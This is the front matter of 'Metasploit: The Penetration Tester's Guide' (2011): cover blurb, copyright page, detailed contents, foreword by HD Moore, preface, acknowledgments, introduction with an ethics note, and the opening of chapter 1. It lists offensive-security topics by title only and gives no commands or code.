@@ -1,0 +1,2745 @@
+The Metasploit Framework makes discovering, 
+exploiting, and sharing vulnerabilities quick and 
+relatively painless. But while Metasploit is used by 
+security professionals everywhere, the tool can be hard to grasp for first-time users. Metasploit: The Penetration Tester’s Guide  fills this gap by teaching you 
+how to harness the Framework and interact with the vibrant community of Metasploit contributors.
+Once you’ve built your foundation for penetration 
+testing, you’ll learn the Framework’s conventions, 
+interfaces, and module system as you launch simulated attacks. You’ll move on to advanced penetration testing 
+techniques, including network reconnaissance and 
+enumeration, client-side attacks, wireless attacks, and targeted social-engineering attacks.
+Learn how to:
+	 Find and exploit unmaintained, misconfigured, and 
+unpatched systems
+	 Perform reconnaissance and find valuable information about your target	 Bypass antivirus technologies and circumvent security controls
+	 Integrate Nmap, NeXpose, and Nessus with Metasploit to automate discovery
+	 Use the Meterpreter shell to launch further attacks from inside the network
+	 Harness stand-alone Metasploit utilities, third-party tools, and plug-ins
+	 Learn how to write your own Meterpreter post-exploitation modules and scripts
+You’ll even touch on exploit discovery for zero-day research, write a fuzzer, port existing exploits into the Framework, and learn how to cover your tracks. Whether 
+your goal is to secure your own networks or to put 
+someone else’s to the test, Metasploit: The Penetration Tester’s Guide  will take you there and beyond.
+“The best guide to the  
+Metasploit Framework.”  — HD Moore,  
+Founder of the Metasploit Project
+$49.95 ($57.95 CDN)  Shelve In: CoMPuTerS/INTerNeT/SeCurITyTHE FINEST IN GEEK ENTERTAINMENT™
+www.nostarch.com
+David Kennedy, Jim O’Gorman, Devon Kearns, and Mati Aharoni
+Foreword by HD MooreKennedy  
+O’Gorman  
+Kearns  
+Aharoni
+Metasploit
+Metasploit
+The Penetration Tester’s Guide
+The Penetration Tester’s Guide
+ “I LAY FLAT.”  This book uses RepKover — a durable binding that won’t snap shut.
+
+METASPLOIT
+
+METASPLOIT
+The Penetration 
+Tester’s Guide
+by David Kennedy, 
+Jim O’Gorman, Devon Kearns, 
+and Mati Aharoni
+San Francisco
+
+METASPLOIT.  Copyright © 2011 by David Kennedy, Jim O'Gorman, Devon Kearns, and Mati Aharoni
+All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic or 
+mechanical, including photocopying, recording, or by any information storage or retrieval system, without the prior 
+written permission of the copy right owner and the publisher.
+15 14 13 12 11 1 2 3 4 5 6 7 8 9ISBN-10: 1-59327-288-X
+ISBN-13: 978-1-59327-288-3
+Publisher: William Pollock
+Production Editor: Alison Law
+Cover Illustration: Hugh D’AndradeInterior Design: Octopod Studios
+Developmental Editors: William Pollock and Tyler Ortman
+Technical Reviewer: Scott WhiteCopyeditor: Lisa Theobald
+Compositors: Susan Glinert Stevens
+Proofreader: Ward WebberIndexer: BIM Indexing & Proofreading Services
+For information on book distributors or translations , please contact No Starch  Press, Inc. directly:
+No Starch Press, Inc.
+38 Ringold Street, San Francisco, CA 94103
+phone: 415.863.9900; fax: 415.863.9950;  info@nostarch.com; www.nostarch.com
+Library of Congress Catalo ging-in-Publication Data
+A catalog record of this book is available from the Library of Congress.
+No Starch Press and the No Starch Pre ss logo are registered trademarks of No  Starch Press, Inc.  Other product and 
+company names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark 
+symbol with every occurrence of a trad emarked name, we are using the names only in an editorial fashion and to the 
+benefit of the trademark owner, with no in tention of infringement of the trademark.
+The information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been 
+taken in the preparation of this work, neither the author no r No Starch Press, Inc. shal l have any liability to any 
+person or entity with respect to any loss or damage caused  or alleged to be caused directly or indirectly by the 
+information contained in it.
+
+BRIEF CONTENTS
+Foreword by HD Moore................................................................................................ xiii
+Preface .......................................................................................................................x vii
+Acknowledgments .........................................................................................................xix
+Introduction .................................................................................................................x xi
+Chapter 1: The Absolute Basics of Pe netration Testing .........................................................1
+Chapter 2: Metasploit Basics............................................................................................7
+Chapter 3: Intelligence Gathering ...................................................................................15Chapter 4: Vulnerability Scanning...................................................................................35
+Chapter 5: The Joy of Exploitation...................................................................................57
+Chapter 6: Meterpreter..................................................................................................75Chapter 7: Avoiding Detection .......................................................................................99
+Chapter 8: Exploitation Using Client-Side Attacks............................................................109
+Chapter 9: Metasploit Auxiliary Modules .......................................................................123Chapter 10: The Social-Engineer Toolkit.........................................................................135
+Chapter 11: Fast-Track.................................................................................................163
+Chapter 12: Karmetasploit ...........................................................................................177Chapter 13: Building Your Own Module........................................................................185
+
+vi Brief ContentsChapter 14: Creating Your Own Exploits.......................................................................197
+Chapter 15: Porting Exploits to the Metasploit Framework................................................215
+Chapter 16: Meterpreter Scripting.................................................................................235Chapter 17: Simulated Penetration Test..........................................................................251Appendix A: Configuring Your Target Machines .............................................................267
+Appendix B: Cheat Sheet.............................................................................................275
+Index.........................................................................................................................2 85
+
+CONTENTS IN DETAIL
+FOREWORD by HD Moore xiii
+PREFACE xviiACKNOWLEDGMENTS xix
+Special Thanks ........................................................................................................ xx
+INTRODUCTION xxi
+Why Do A Penetration Test? ................................................................................... xxii
+Why Metasploit? .................................................................................................. xxiiA Brief History of Metasploit ................................................................................... xxii
+About this Book .....................................................................................................xxiii
+What’s in the Book? ..............................................................................................xxiiiA Note on Ethics ..................................................................................................xxiv
+1
+THE ABSOLUTE BASICS OF PENETRATION TESTING 1
+The Phases of the PTES .............................................................................................. 2
+Pre-engagement Interactions ......................................................................... 2
+Intelligence Gathering .................................................................................. 2Threat Modeling ......................................................................................... 2
+Vulnerability Analysis .................................................................................. 3
+Exploitation ................................................................................................ 3Post Exploitation .......................................................................................... 3
+Reporting ................................................................................................... 4
+Types of Penetration Tests .......................................................................................... 4
+Overt Penetration Testing ............................................................................. 5
+Covert Penetration Testing ............................................................................ 5
+Vulnerability Scanners .............................................................................................. 5Pulling It All Together ................................................................................................ 6
+2
+METASPLOIT BASICS 7
+Terminology ............................................................................................................ 7
+Exploit ....................................................................................................... 8
+Payload ..................................................................................................... 8Shellcode ................................................................................................... 8
+Module ...................................................................................................... 8
+Listener ...................................................................................................... 8
+Metasploit Interfaces ................................................................................................. 8
+MSFconsole ................................................................................................ 9
+MSFcli ....................................................................................................... 9
+Armitage .................................................................................................. 11
+
+viii Contents in DetailMetasploit Utilities .................................................................................................. 12
+MSFpayload ............................................................................................. 12MSFencode .............................................................................................. 13Nasm Shell ............................................................................................... 13
+Metasploit Express and Metasploit Pro ...................................................................... 14Wrapping Up ........................................................................................................ 14
+3
+INTELLIGENCE GATHERING 15
+Passive Information Gathering ................................................................................. 16
+whois Lookups .......................................................................................... 16Netcraft ................................................................................................... 17NSLookup ................................................................................................ 18
+Active Information Gathering ................................................................................... 18
+Port Scanning with Nmap .......................................................................... 18Working with Databases in Metasploit ........................................................ 20Port Scanning with Metasploit ..................................................................... 25
+Targeted Scanning ................................................................................................. 26
+Server Message Block Scanning .................................................................. 26Hunting for Poorly Configured Microsoft SQL Servers .................................... 27SSH Server Scanning ................................................................................. 28FTP Scanning ............................................................................................ 29Simple Network Management Pr otocol Sweeping ......................................... 30
+Writing a Custom Scanner ...................................................................................... 31Looking Ahead ...................................................................................................... 33
+4
+VULNERABILITY SCANNING 35
+The Basic Vulnerability Scan .................................................................................... 36
+Scanning with NeXpose .......................................................................................... 37
+Configuration ........................................................................................... 37Importing Your Report into the Metasploit Framework .................................... 42Running NeXpose Within MSFconsole ......................................................... 43
+Scanning with Nessus ............................................................................................. 44
+Nessus Configuration ................................................................................ 44Creating a Nessus Scan Policy ................................................................... 45Running a Nessus Scan .............................................................................. 47Nessus Reports ......................................................................................... 47Importing Results into the Metasploit Framework ............................................ 48Scanning with Nessus from Within Metasploit .............................................. 49
+Specialty Vulnerability Scanners ............................................................................... 51
+Validating SMB Logins ............................................................................... 51Scanning for Open VNC Authentication ....................................................... 52Scanning for Open X11 Servers .................................................................. 54
+Using Scan Results for Autopwning ........................................................................... 56
+5
+THE JOY OF EXPLOITATION 57
+Basic Exploitation ................................................................................................... 58
+msf> show exploits .................................................................................... 58msf> show auxiliary .................................................................................. 58
+
+Contents in Detail ixmsf> show options .................................................................................... 58
+msf> show payloads .................................................................................. 60msf> show targets ..................................................................................... 62
+info ......................................................................................................... 63
+set and unset ............................................................................................ 63
+setg and unsetg ......................................................................................... 64
+save ........................................................................................................ 64
+Exploiting Your First Machine .................................................................................. 64
+Exploiting an Ubuntu Machine ................................................................................. 68
+All-Ports Payloads: Brute Forcing Ports ....................................................................... 71Resource Files ........................................................................................................ 72
+Wrapping Up ........................................................................................................ 73
+6
+METERPRETER 75
+Compromising a Windows XP Virtual Machine .......................................................... 76
+Scanning for Ports with Nmap .................................................................... 76
+Attacking MS SQL ..................................................................................... 76
+Brute Forcing MS SQL Server ...................................................................... 78The xp_cmdshell ........................................................................................ 79
+Basic Meterpreter Commands ..................................................................... 80
+Capturing Keystrokes ................................................................................. 81
+Dumping Usernames and Passwords ........................................................................ 82
+Extracting the Password Hashes .................................................................. 82
+Dumping the Password Hash ...................................................................... 83
+Pass the Hash ........................................................................................................ 84
+Privilege Escalation ................................................................................................ 85
+Token Impersonation ............................................................................................... 87Using ps ............................................................................................................... 87
+Pivoting onto Other Systems .................................................................................... 89
+Using Meterpreter Scripts ........................................................................................ 92
+Migrating a Process ................................................................................... 92
+Killing Antivirus Software ........................................................................... 93
+Obtaining System Password Hashes ............................................................ 93Viewing All Traffic on a Target Machine ...................................................... 93
+Scraping a System .................................................................................... 93
+Using Persistence ...................................................................................... 94
+Leveraging Post Exploitation Modules ....................................................................... 95
+Upgrading Your Command Shell to Meterpreter ......................................................... 95
+Manipulating Windows APIs with the Railgun Add-On ................................................ 97Wrapping Up ........................................................................................................ 97
+7
+AVOIDING DETECTION 99
+Creating Stand-Alone Binaries with MSFpayload ...................................................... 100
+Evading Antivirus Detection ................................................................................... 101
+Encoding with MSFencode ....................................................................... 102
+Multi-encoding ........................................................................................ 103
+Custom Executable Templates ................................................................................ 105
+Launching a Payload Stealthily................................................................................ 106
+
+x Contents in DetailPackers ............................................................................................................... 107
+A Final Note on Antivirus Software Evasion ............................................................. 108
+8
+EXPLOITATION USING CLIENT-SIDE ATTACKS 109
+Browser-Based Exploits ......................................................................................... 110
+How Browser-Based Exploits Work ............................................................ 111
+Looking at NOPs ..................................................................................... 112
+Using Immunity Debugger to Decipher NOP Shellcode ............................................. 112
+Exploring the Internet Explorer Aurora Exploit .......................................................... 116
+File Format Exploits .............................................................................................. 119Sending the Payload ............................................................................................ 120
+Wrapping Up ...................................................................................................... 121
+9
+METASPLOIT AUXILIARY MODULES 123
+Auxiliary Modules in Use ...................................................................................... 126
+Anatomy of an Auxiliary Module ............................................................................ 128Going Forward .................................................................................................... 133
+10
+THE SOCIAL-ENGINEER TOOLKIT 135
+Configuring the Social-Engineer Toolkit ................................................................... 136
+Spear-Phishing Attack Vector ................................................................................. 137
+Web Attack Vectors .............................................................................................. 142
+Java Applet ............................................................................................ 142
+Client-Side Web Exploits .......................................................................... 146
+Username and Password Harvesting .......................................................... 148Tabnabbing ............................................................................................ 150
+Man-Left-in-the-Middle .............................................................................. 150
+Web Jacking .......................................................................................... 151Putting It All Together with a Multipronged Attack ........................................ 153
+Infectious Media Generator ................................................................................... 157
+Teensy USB HID Attack Vector ............................................................................... 157Additional SET Features ........................................................................................ 160
+Looking Ahead .................................................................................................... 161
+11
+FAST-TRACK 163
+Microsoft SQL Injection ......................................................................................... 164
+SQL Injector—Query String Attack ............................................................. 165
+SQL Injector—POST Parameter Attack ........................................................ 166Manual Injection ..................................................................................... 167
+MSSQL Bruter ......................................................................................... 168
+SQLPwnage ............................................................................................ 172
+Binary-to-Hex Generator ........................................................................................ 174
+Mass Client-Side Attack ........................................................................................ 175A Few Words About Automation ............................................................................ 176
+
+Contents in Detail xi12
+KARMETASPLOIT 177
+Configuration ...................................................................................................... 178
+Launching the Attack ............................................................................................. 179
+Credential Harvesting ........................................................................................... 181
+Getting a Shell ..................................................................................................... 182
+Wrapping Up ...................................................................................................... 184
+13
+BUILDING YOUR OWN MODULE 185
+Getting Command Execution on Microsoft SQL ........................................................ 186
+Exploring an Existing Metasploit Module ................................................................. 187
+Creating a New Module ....................................................................................... 189
+PowerShell ............................................................................................. 189
+Running the Shell Exploit .......................................................................... 190
+Creating powershell_upload_exec ............................................................. 192Conversion from Hex to Binary ................................................................. 192
+Counters ................................................................................................ 194
+Running the Exploit .................................................................................. 195
+The Power of Code Reuse ..................................................................................... 196
+14
+CREATING YOUR OWN EXPLOITS 197
+The Art of Fuzzing ................................................................................................ 198
+Controlling the Structured Exception Handler ........................................................... 201
+Hopping Around SEH Restrictions ........................................................................... 204
+Getting a Return Address ...................................................................................... 206Bad Characters and Remote Code Execution ........................................................... 210
+Wrapping Up ...................................................................................................... 213
+15
+PORTING EXPLOITS TO THE METASPLOIT FRAMEWORK 215
+Assembly Language Basics .................................................................................... 216
+EIP and ESP Registers ............................................................................... 216
+The JMP Instruction Set ............................................................................. 216NOPs and NOP Slides ............................................................................ 216
+Porting a Buffer Overflow ...................................................................................... 216
+Stripping the Existing Exploit ..................................................................... 218Configuring the Exploit Definition .............................................................. 219
+Testing Our Base Exploit .......................................................................... 220
+Implementing Features of the Framework .................................................... 221Adding Randomization ............................................................................ 222
+Removing the NOP Slide .......................................................................... 223
+Removing the Dummy Shellcode ................................................................ 223Our Completed Module ........................................................................... 224
+SEH Overwrite Exploit .......................................................................................... 226
+Wrapping Up ...................................................................................................... 233
+
+xii Contents in Detail16
+METERPRETER SCRIPTING 235
+Meterpreter Scripting Basics .................................................................................. 235
+Meterpreter API .................................................................................................... 241
+Printing Output ........................................................................................ 241
+Base API Calls ........................................................................................ 242
+Meterpreter Mixins .................................................................................. 242
+Rules for Writing Meterpreter Scripts ...................................................................... 244Creating Your Own Meterpreter Script .................................................................... 244
+Wrapping Up ...................................................................................................... 250
+17
+SIMULATED PENETRATION TEST 251
+Pre-engagement Interactions .................................................................................. 252
+Intelligence Gathering ........................................................................................... 252
+Threat Modeling .................................................................................................. 253
+Exploitation ......................................................................................................... 255Customizing MSFconsole ...................................................................................... 255
+Post Exploitation ................................................................................................... 257
+Scanning the Metasploitable System .......................................................... 258Identifying Vulnerable Services ................................................................. 259
+Attacking Apache Tomcat ..................................................................................... 260
+Attacking Obscure Services ................................................................................... 262Covering Your Tracks ........................................................................................... 264
+Wrapping Up ...................................................................................................... 266
+A
+CONFIGURING YOUR TARGET MACHINES 267
+Installing and Setting Up the System ....................................................................... 267
+Booting Up the Linux Virtual Machines .................................................................... 268
+Setting Up a Vulnerable Windows XP Installation ..................................................... 269
+Configuring Your Web Server on Windows XP ........................................... 269Building a SQL Server .............................................................................. 269
+Creating a Vulnerable Web Application .................................................... 272
+Updating Back|Track .............................................................................. 273
+B
+CHEAT SHEET 275
+MSFconsole Commands ........................................................................................ 275
+Meterpreter Commands ........................................................................................ 277
+MSFpayload Commands ....................................................................................... 280MSFencode Commands ........................................................................................ 280
+MSFcli Commands ............................................................................................... 281
+MSF, Ninja, Fu .................................................................................................... 281MSFvenom .......................................................................................................... 281
+Meterpreter Post Exploitation Commands ................................................................ 282
+INDEX 285
+
+FOREWORD
+Information technology is a complex field, littered 
+with the half-dead technology of the past and an ever-increasing menagerie of  new systems, software, 
+and protocols. Securing to day’s enterprise networks 
+involves more than simply patch management, fire-walls, and user education; it requires frequent real-
+world validation of what wo rks and what fails. This is 
+what penetration te sting is all about.
+Penetration testing is a uniquely chal lenging job. You are paid to think 
+like a criminal, to use guerilla tactics to  your advantage, and to find the weak-
+est links in a highly intricate net of defenses. The things you find can be both surprising and disturbing; penetration tests have uncovered everything from 
+rogue pornography sites to large-sc ale fraud and crim inal activity.
+Penetration testing is about ignoring  an organization’s perception of 
+its security and probing its systems for weaknesses. The data obtained from a 
+successful penetration test often uncovers issues th at no architecture review 
+
+xiv Forewordor vulnerability assessment would be able  to identify. Typical findings include 
+shared passwords, cross-connected networ ks, and troves of sensitive data sit-
+ting in the clear. The problems create d by sloppy system administration and 
+rushed implementations often pose sign ificant threats to an organization, 
+while the solutions languish under a do zen items on an administrator’s to-do 
+list. Penetration testing highlights thes e misplaced prioriti es and identifies 
+what an organization needs to do to defend itself from a real intrusion.
+Penetration testers handle a company’ s most sensitive resources; they 
+gain access to areas that can have dire  real-world consequences if the wrong 
+action is taken. A single misplaced pack et can bring a factory floor to a halt, 
+with a cost measured in millions of dollars per hour. Failu re to notify the 
+appropriate personnel can result in an uncomfortable and embarrassing con-
+versation with the local police. Medica l systems are one area that even the 
+most experienced security  professionals may hesita te to test; nobody wants 
+to be responsible for mixing up a pati ent’s blood type in an OpenVMS main-
+frame or corrupting the memory on an  X-ray machine running Windows XP. 
+The most critical systems are often th e most exposed, and few system admin-
+istrators want to risk an outage by bringing down a database server to apply a security patch.
+Balancing the use of available attack paths and the risk of causing dam-
+age is a skill that all penetration test ers must hone. This process depends not 
+only on a technical knowledge of the to ols and the techniques but also on a 
+strong understanding of how the organization operates and where the path of least resistance may lie.
+In this book, you will see penetratio n testing through the eyes of four 
+security professionals with widely divergent backgrounds. The authors include folks with experience at the top of the corporate security structure all the way 
+down to the Wild West world of unde rground exploit development and vulner-
+ability research. There are a number of books available on penetration test-ing and security assessments, and there ar e many that focus entirely on tools. 
+This book, however, strives for a balance between the two, covering the fun-damental tools and techniques while also  explaining how they play into the 
+overall structure of a successful penetration testing process. Experienced penetration testers will benefit from the discussion of the methodology, 
+which is based on the recently codified  Penetration Test Execution Standard. 
+Readers who are new to the field will be  presented with a wealth of informa-
+tion not only about how to get starte d but also why those steps matter and 
+what they mean in the bigger picture.
+This book focuses on th e Metasploit Framework. This open source 
+platform provides a consiste nt, reliable library of constantly updated exploits 
+and offers a complete development en vironment for building new tools and 
+automating every aspect of  a penetration test. Meta sploit Express and Meta-
+sploit Pro, the commercial siblings of the Framework, are also represented in 
+this book. These products provide a di fferent perspective on how to conduct 
+and automate large-scale penetration tests.
+
+Foreword xvThe Metasploit Framework is an infamously volatile project; the code 
+base is updated dozens of times every day by a core group of developers and 
+submissions from hundreds of community contributors. Writing a book about the Framework is a masochistic endeavor ; by the time that a given chapter 
+has been proofread, the content may already be out of date. The authors 
+took on the Herculean task of writing this book in such a way that the con-tent will still be applicable by the time it reaches its readers.
+The Metasploit team has been involved with this book to make sure that 
+changes to the code are accurately reflecte d and that the final result is as close 
+to zero-day coverage of the Metasploit  Framework as is hu manly possible. We 
+can state with full confidence that it is  the best guide to the Metasploit Frame-
+work available today, and it will likely remain so for a long time. We hope you 
+find this book valuable in your work an d an excellent reference in your trials 
+ahead.
+HD Moore
+Founder, The Metasploit Project
+
+PREFACE
+The Metasploit Framework has long been one of the 
+tools most widely used by information security pro-
+fessionals, but for a long time little documentation 
+existed aside from the source  code itself or comments 
+on blogs. That situation ch anged significantly when 
+Offensive-Security develope d its online course, Meta-
+sploit Unleashed. Shortly afte r the course went live, No 
+Starch Press contacted us ab out the possibly of creat-
+ing a book to expand on our work with Metasploit Unleashed.
+This book is designed to teach you the ins and outs of Metasploit and 
+how to use the Framework to its fullest. Our coverage is selective—we won’t cover every single flag or exploit—but we give you the foundation you’ll need 
+to understand and use Metasploit  now and in future versions. 
+
+xviii PrefaceWhen we began writing this book, we had in mind a comment by HD 
+Moore, developer of the Metasploit Fr amework. In a conversation with HD 
+about the development of our Metasploit  Unleashed course, one of us said 
+to him, “I hope the course comes out good.” To this offhand comment, HD merely replied, “Then make sure it is good.” And that’s just what we’ve attempted to do with this book. 
+As a group, we are experienced pene tration testers who use Metasploit 
+daily to circumvent security controls, bypass protections, and attack systems 
+methodically. We wrote this book with the intention of helping our readers 
+become competent penetration testers. HD’s drive and focus on quality is 
+apparent within the Metasploit Framework, and we have tried to match those characteristics in this book. We leave it  up to you to judge how well we have 
+lived up to that standard.
+
+ACKNOWLEDGMENTS
+We would like to thank a number of people, begin-
+ning with the folks whose hard work provides the 
+community with an invaluable  tool. Special thanks to 
+the Metasploit Team: HD Moore, James Lee, David D. Rude II, Tod Beardsley, Jonathan Cran, Stephen Fewer, Joshua Drake, Mario Ceballos, Ramon Valle,
+Patrick Webster, Efrain Torres, Alexan dre Maloteaux, Wei Chen, Steve Tornio, 
+Nathan Keltner, Chris Gates, Carlos Perez, Matt Weeks, and Raphael Mudge. Also an extra thanks to Carlos Perez fo r his assistance in writing portions of 
+the Meterpreter scripting chapter.
+Many thanks to Scott White, technica l reviewer for this book, for being 
+awesome.
+Thanks to Offensive-Security for brin ging us all together. The Offensive-
+Security trademark phrase “Try Harder” alternately inspires and tortures us (ryujin is evil).
+
+xx AcknowledgmentsWe have many other members of th e information security community 
+to thank, but there are too many to list and the odds of missing someone are high. So thank you to our friends in the security community; hugs from all 
+of us.
+A very special thanks to the whole crew at No Starch Press for their 
+immeasurable effort. Bill, Alison, Travis, and Tyler, it has been a pleasure working with you and everyone else be hind the scenes at No Starch Press!
+Finally, a big thank you to our families. We are all married and half of 
+us have children. We spend far too lo ng wearing down the plastic on our 
+keyboards and not enough time with them. To our families, thanks for your understanding; we will make it up to you—as soon as we update this next 
+line of code, or find the source of this  memory corruption, or finish this svn 
+update, or get this next fuzzer run setup, or . . .
+Special Thanks
+Dave (Twitter: @dave_rel1k):  I dedicate my work on this book to my loving 
+wife Erin, who tolerated late nights of me hammering away at the keyboard. To my three children who keep me young and old at the same time. To my father, Jim; my mother, Janna; and my  stepmother, Deb, for being there for 
+me and making me what I am today. Thanks to Jim, Dookie, and Muts for 
+their hard work on the book and for be ing great friends! To my good friends 
+at Offensive-Security; Chris “Logan” Ha dnagy; my brother,  Shawn Sullivan; 
+and my team at Diebold. To my good friend HD Moore, whose dedication to 
+the security industry is an inspiration to us all. To all my friends in life, and to 
+Scott Angelo for giving me an opport unity and believing in me. Lastly, to 
+God, without whom none of this would be possible.
+Devon (@dookie2000ca):  For my beautiful and tolerant wife, who not 
+only supports but encourages my mani a. You are my inspiration and motiva-
+tion; without you by my side in thes e pursuits, I would never get anywhere. 
+To my co-authors, thank you for having  faith in a newcomer and welcoming 
+me as one of your own. Lastly, an especially big thank you to Mati for not 
+only getting this merry band together but for giving me a chance.
+Muts (@backtracklinux):  A special thanks to the co-authors of this book, 
+whose time and dedication to it is tr uly inspiring. I count Jim, Devon, and 
+Dave as great friends and colle agues in the security field.
+Jim (@_Elwood_): Thanks to Matteo, Chris “Logan,” and the entire 
+Offensive-Security crew. Also a big thanks to Robert, Matt, Chris, and my co-workers at StrikeForce. And to my wonderful wife Melissa: The book you hold in your hands is proof that I was not just avoiding housework all the time. 
+And to Jake and Joe, please don’t tell Mom that I am just playing games with 
+you when I tell her I am working. You three are the Pack-a-Punch to my life. 
+And finally to my co-authors Mati, Devon, and Dave: Thanks for letting me put my name on this book—I real ly was just avoiding housework.
+
+INTRODUCTION 
+Imagine that sometime in th e not-so-distant future an 
+attacker decides to attack  a multinational company’s 
+digital assets, targeting hundre ds of millions of dollars 
+worth of intellectual proper ty buried behind millions 
+of dollars in infrastructure . Naturally, the attacker 
+begins by firing up the late st version of Metasploit.
+After exploring the target’s perimeter,  he finds a soft spot and begins a 
+methodical series of attacks, but even  after he’s compro mised nearly every 
+aspect of the network, the fun has on ly just begun. He maneuvers through 
+systems, identifying core, critical bu siness components that keep the com-
+pany running. With a single keystroke, he could help himself to millions of 
+company dollars and compromise all their sensitive data.
+Congratulations on a job well done—y ou’ve shown true business impact, 
+and now it’s time to write the report. Oddly enough, today’s penetration testers often find themselves in the role  of a fictitious adversary like the one 
+described above, performing legal attacks at the request of companies that need high levels of security. Welcome to the world of penetration testing and 
+the future of security.
+
+xxii IntroductionWhy Do a Penetration Test?
+Companies invest millions of dollars in  security programs to protect critical 
+infrastructures, identify ch inks in the armor, and prev ent serious data breaches. 
+A penetration test is one of the most e ffective ways to identify systemic weak-
+nesses and deficiencies in these programs . By attempting to circumvent secu-
+rity controls and bypass se curity mechanisms, a penetr ation tester is able to 
+identify ways in which a hacker might be  able to compromise an organization’s 
+security and damage the organization as a whole. 
+As you read through this book, reme mber that you’re not necessarily 
+targeting one system or multiple systems.  Your goal is to show, in a safe and 
+controlled manner, how an attacker migh t be able to cause serious harm to 
+an organization and impact its ability to, among other things, generate reve-
+nue, maintain its reputation,  and protect its customers. 
+Why Metasploit? 
+Metasploit isn’t just a tool; it’s an en tire framework that provides the infra-
+structure needed to automate mundane,  routine, and complex tasks. This 
+allows you to concentrate on the unique  or specialized aspe cts of penetration 
+testing and on identifying flaws within  your information security program.
+As you progress through the chapters in this book and establish a well-
+rounded methodology, you will begin to  see the many ways in which Meta-
+sploit can be used in your penetration tests. Metasploit allows you to easily 
+build attack vectors to augment its ex ploits, payloads, encoders, and more 
+in order to create and execute more adva nced attacks. At various points in 
+this book we explain several third-part y tools—including some written by the 
+authors of this book—that build on the Metasploit Framework. Our goal is to 
+get you comfortable with the Framework,  show you some advanced attacks, 
+and ensure that you can apply these te chniques responsibly. We hope you 
+enjoy reading this book as much as we enjoyed creating it. Let the fun and games begin.
+A Brief History of Metasploit
+Metasploit was originally developed and conceived by HD Moore while he was employed by a security firm. When HD realized that he was spending most of his time validating and sanitizi ng public exploit code, he began to 
+create a flexible and maintainable fr amework for the creation and develop-
+ment of exploits. He released his firs t edition of the Perl -based Metasploit 
+in October 2003 with a total of 11 exploits. 
+With the help of Spoonm, HD releas ed a total rewrite of the project, 
+Metasploit 2.0, in April 2004. This version included 19 exploits and over 27 payloads. Shortly after this release, Matt Miller (Skape) joined the Metasploit development team, and as the project ga ined popularity, the Metasploit Frame-
+work received heavy backing from th e information security community and 
+quickly became a necessary tool for penetration testing and exploitation.
+
+Introduction xxiiiFollowing a complete rewrite in the Ruby programming language, 
+the Metasploit team released Metasploit 3.0 in 2007. The migration of the Framework from Perl to Ruby took 18 months and resulted in over 150,000 
+lines of new code. With the 3.0 release,  Metasploit saw widespread adoption 
+in the security community and a bi g increase in user contributions.
+In fall 2009, Metasploit was acquir ed by Rapid7, a leader in the 
+vulnerability-scanning field, which al lowed HD to build a team to focus 
+solely on the development of the Meta sploit Framework. Since the acquisi-
+tion, updates have occurred more rapidly than anyone could have imagined. Rapid7 released two commercial products based on the Metasploit Frame-work: Metasploit Express an d Metasploit Pro. Metasploit Express is a lighter 
+version of the Metasploit Framework with  a GUI and additional functionality, 
+including reporting, among other useful fe atures. Metasploit Pro is an expanded 
+version of Metasploit Express that touts collaboration and group penetration testing and such features as a one-cl ick virtual private network (VPN) tunnel 
+and much more. 
+About This Book
+This book is designed to teach you everything from the fundamentals of the Framework to advanced techniques in exploitation. Ou r goal is to pro-
+vide a useful tutorial for the beginner and a reference for practitioners. How-
+ever, we won’t always hold your hand . Programming knowledge is a definite 
+advantage in the penetration testing fiel d, and many of the examples in this 
+book will use either the Ruby or Pyth on programming language. Still, while 
+we suggest that you learn a language like Ruby or Python to aid in advanced 
+exploitation and customization of a ttacks, programming knowledge is not 
+required.
+As you grow more comfortable with Metasploit, you will notice that the 
+Framework is frequently updated with new features, exploi ts, and attacks. 
+This book was developed with the knowledge that Metasploit is continually changing and that no printed book is likely to be able to keep pace with this rapid development. Therefore, we focu s on the fundamentals, because once 
+you understand how Metasploit works yo u will be able to ramp up quickly 
+with updates to the Framework.
+What’s in the Book?
+How can this book help you to get started or take your skills to the next level? Each chapter is designed to build on the previous one and to help you build 
+your skills as a penetration tester from the ground up.
+zChapter 1, “The Absolute Basics of Penetration Testing,” establishes the 
+methodologies around penetration testing.
+zChapter 2, “Metasploit Basics,” is your introduction to the various tools 
+within the Metasploit Framework.
+zChapter 3, “Intelligence Gathering,” shows you ways to leverage Meta-
+sploit in the reconnaissance phase of a penetration test.
+
+xxiv IntroductionzChapter 4, “Vulnerability Scanning,”  walks you through identifying vul-
+nerabilities and leveraging vulnerability scanning technology.
+zChapter 5, “The Joy of Exploitation ,” throws you into exploitation.
+zChapter 6, “Meterpreter,” walks yo u through the Swiss Army knife of 
+post exploitation: Meterpreter.
+zChapter 7, “Avoiding Detection,” focu ses on the underlying concepts of 
+antivirus evasion techniques.
+zChapter 8, “Exploitation Using Client -Side Attacks,” covers client-side 
+exploitation and browser bugs. 
+zChapter 9, “Metasploit Auxiliary Mo dules,” walks you through auxiliary 
+modules. 
+zChapter 10, “The Social-Engineer Tool kit,” is your guide to leveraging 
+the Social-Engineer Toolkit in social-engineering attacks. 
+zChapter 11, “Fast-Track,” offers a co mplete run down on Fast-Track, an 
+automated penetration testing framework. 
+zChapter 12, “Karmetasplo it,” shows you how to leverage Karmetasploit 
+for wireless attacks. 
+zChapter 13, “Building Your Own Mo dules,” teaches you how to build 
+your own exploitation module. 
+zChapter 14, “Creating Your Own Exploits,” covers fuzzing and creating exploit modules out of  buffer overflows. 
+zChapter 15, “Porting Exploits to th e Metasploit Framework,” is an in-
+depth look at how to port existing ex ploits into a Metasploit-based module.
+zChapter 16, “Meterpreter Scripting,” shows you how to create your own 
+Meterpreter scripts. 
+zChapter 17, “Simulated Pene tration Test,” pulls ever ything together as it 
+walks you through a simu lated penetration test.
+A Note on Ethics 
+Our goal in writing this book is to help  you to improve your skills as a pene-
+tration tester. As a penetr ation tester, you will be by passing security measures; 
+that’s simply part of the job. When  you do, keep the following in mind:
+zDon’t be malicious.
+zDon’t be stupid.
+zDon’t attack targets without written permission.
+zConsider the consequences of your actions.
+zIf you do things illegally, you can be caught and put in jail!
+Neither the authors of this book nor No Starch Press,  its publisher, 
+condones or encourages the misuse of the penetration testing techniques 
+discussed herein. Our goal is to make you smarter, not to help you to get 
+into trouble, because we won’t be there to get you out.
+
+THE ABSOLUTE BASICS OF 
+PENETRATION TESTING
+Penetration testing is a wa y for you to simulate the 
+methods that an attacker might use to circumvent 
+security controls and gain access to an organization’s 
+systems. Penetration testing is more than running scan-
+ners and automated tools an d then writing a report. 
+And you won’t become an ex pert penetration tester 
